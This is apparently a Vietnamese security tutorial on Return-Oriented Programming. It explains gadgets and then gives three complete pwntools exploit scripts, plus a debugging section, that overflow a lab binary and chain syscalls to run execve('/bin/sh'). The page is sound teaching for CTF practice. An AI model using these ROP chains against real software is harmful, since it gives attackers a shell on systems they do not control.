ROP Basics

Return-Oriented Programming: khi NX chặn shellcode, ta "lập trình" bằng các gadget có sẵn — mỗi gadget là vài lệnh kết thúc ret. Xâu chuỗi địa chỉ gadget trên stack → CPU chạy lần lượt như một chương trình. Bài này dựng chuỗi execve("/bin/sh") bằng syscall, số thật.

00 / TÓM TẮT 1 PHÚT

Bài này nói về cái gì?

Gadget: một dãy ngắn lệnh máy kết thúc ret, vd pop rdi; ret. ret = "lấy địa chỉ kế trên stack rồi nhảy tới" → nếu stack toàn địa chỉ gadget, CPU chạy chúng liên tiếp.

ROP chain: xâu các gadget + hằng số trên stack để đặt thanh ghi rồi gọi hàm/syscall. Vd đặt rax=59, rdi=&"/bin/sh", rsi=0, rdx=0 rồi syscall → execve("/bin/sh",0,0).

Vì sao cần: NX chặn shellcode; ROP dùng code có sẵn nên luôn thực thi được. Là xương sống của mọi khai thác stack hiện đại.

Nếu chỉ nhớ một điều: stack = "danh sách lệnh"; mỗi ret nhảy tới địa chỉ kế; pop để nạp hằng số vào thanh ghi.

⚠️ Bẫy

Gadget "bẩn" (pop rsi; pop r15; ret) ăn 2 hằng → thêm 1 giá trị rác. Thiếu "/bin/sh" → ghi vào bss bằng chuỗi read trước. movaps align khi gọi system (không cần cho syscall thuần).

01 / NỀN TẢNG BẮT BUỘC

ret biến stack thành chương trình

Lệnh ret làm hai việc: pop 8 byte trên đỉnh stack vào rip rồi nhảy tới đó; rsp tiến lên 8. Vậy nếu đỉnh stack là một dãy địa chỉ, mỗi ret "tiêu thụ" một địa chỉ và nhảy tới. Gadget là đoạn lệnh ngắn kết thúc bằng ret — chạy xong nó lại ret, nhảy tới gadget kế. Đó là cách ta ghép "chương trình" từ mảnh vụn.

Định nghĩa nhanh

ROP

Lập trình bằng gadget thay vì shellcode.

gadget

Vài lệnh kết thúc ret.

ROP chain

Dãy gadget+hằng trên stack.

syscall gadget

Lệnh syscall; ret để gọi kernel.

stack pivot

Đổi rsp sang vùng khác (bài riêng).

SYS_execve

syscall số 59 (x86-64).

02 / VÌ SAO CÓ KỸ THUẬT

Turing-complete từ mảnh vụn

Shacham (2007) chỉ ra: chỉ với các gadget có sẵn trong libc, ta dựng được tính toán Turing-complete — tức làm được mọi thứ code mới làm được, mà không cần nhét code mới (vượt NX). Trong CTF, thường không cần Turing-complete: chỉ cần vài gadget để đặt thanh ghi rồi gọi system/execve/mprotect. ROP là nền của ret2libc, ret2csu, ret2syscall, SROP...

04 / DỰNG CHUỖI

Nếu không có sẵn "/bin/sh"

Binary static có thể không chứa chuỗi "/bin/sh". Khi đó: ghi "/bin/sh" vào bss trước (dùng syscall read hoặc gadget mov [rdi], rax), rồi execve trỏ tới bss.

# cách 1: read(0, bss, 8) nhập "/bin/sh\0" rồi execve(bss,0,0)
pop rax; ret → 0          # SYS_read
pop rdi; ret → 0          # fd=0 (stdin)
pop rsi; ret → bss         # buf
pop rdx; ret → 8          # len
syscall                    # → nhập "/bin/sh\0"
# rồi chuỗi execve(bss,0,0)
write-what-where gadgetNếu có mov qword [rdi], rax; ret: pop rdi=bss, pop rax="/bin/sh" (8 byte số), rồi gadget ghi. Rất hữu ích khi stdin không dùng được.

07 / EXPLOIT ĐẦY ĐỦ

execve("/bin/sh") bằng syscall (static binary)

// vuln.c — gcc vuln.c -o vuln -static -fno-stack-protector -no-pie
int main(){ char b[0x40]; read(0, b, 0x200); }   // overflow, binary static
# BẢN A — số thật, chuỗi execve bằng syscall.
from pwn import *
exe = ELF("./vuln", checksec=False)
p = process(exe.path)

OFF = 72
pop_rax = 0x44db34; pop_rdi = 0x401263
pop_rsi = 0x40955e; pop_rdx = 0x4017cf; syscall = 0x40137c
binsh   = next(exe.search(b"/bin/sh"))     # 0x4c0f43 nếu static có sẵn

chain  = b"A"*OFF
chain += p64(pop_rax) + p64(59)          # SYS_execve
chain += p64(pop_rdi) + p64(binsh)
chain += p64(pop_rsi) + p64(0)
chain += p64(pop_rdx) + p64(0)
chain += p64(syscall)
p.send(chain)
p.interactive()
Thành thậtĐịa chỉ gadget (0x44db34…) & binsh=0x4c0f43 là của binary mẫu static — của bạn khác (ROPgadget). OFF=72 dò bằng cyclic. Nếu pop rsi là gadget bẩn (pop rsi; pop r15) → thêm 1 giá trị rác sau rsi value.
# BẢN B — pwntools ROP tự chọn gadget & xử lý gadget bẩn.
from pwn import *
context.binary = exe = ELF("./vuln", checksec=False)
p = process(exe.path)
OFF = 72

r = ROP(exe)
binsh = next(exe.search(b"/bin/sh"))
r.execve(binsh, 0, 0)              # tự dựng rax=59, rdi/rsi/rdx, syscall
# nếu không có /bin/sh: r.read(0, exe.bss(0x100), 8) trước
p.send(b"A"*OFF + r.chain())
p.sendline(b"/bin/sh\x00")             # nếu dùng read
p.interactive()
log.info(r.dump())                     # in chuỗi ROP để kiểm
r.dump()ROP.dump() in bố cục chuỗi (địa chỉ + ý nghĩa) — cực tiện để debug thứ tự gadget & gadget bẩn.
# BẢN C — pwnld.
from pwnld import *
context.binary = exe = ELF("./vuln", checksec=False)
p = start(); OFF = 72
r = ROP(exe)
r.execve(next(exe.search(b"/bin/sh")), 0, 0)
sl(b"A"*OFF + r.chain())

09 / GỠ LỖI

Khi chain không chạy

Lệch do gadget bẩn

pop rsi; pop r15; ret ăn 2 hằng. Thêm rác. r.dump() kiểm.

Crash ngay gadget đầu

Offset sai → saved RIP chưa đúng. Dò cyclic lại.

syscall lỗi (rax trả -14)

Đối số sai (con trỏ xấu). Kiểm rdi/rsi/rdx bằng gdb.

movaps khi gọi system

Căn rsp 0x10 bằng gadget ret (syscall thuần không cần).

Không đủ gadget

Dùng ret2csu set rdx, hoặc ret2dlresolve.

Null byte cắt payload

Nếu nhập bằng scanf %s: địa chỉ có null bị cắt. Dùng read.

11 / LUYỆN TẬP

Bài tập tăng dần

⭐⭐ · execve có sẵn /bin/sh

Static binary có "/bin/sh": dựng chuỗi syscall execve bằng tay.

⭐⭐⭐ · Ghi /bin/sh vào bss

Không có chuỗi: read syscall ghi vào bss, rồi execve(bss).

Chỉ có pop rsi; pop r15; ret và mov [rdi],rax: dựng write-what-where + execve.
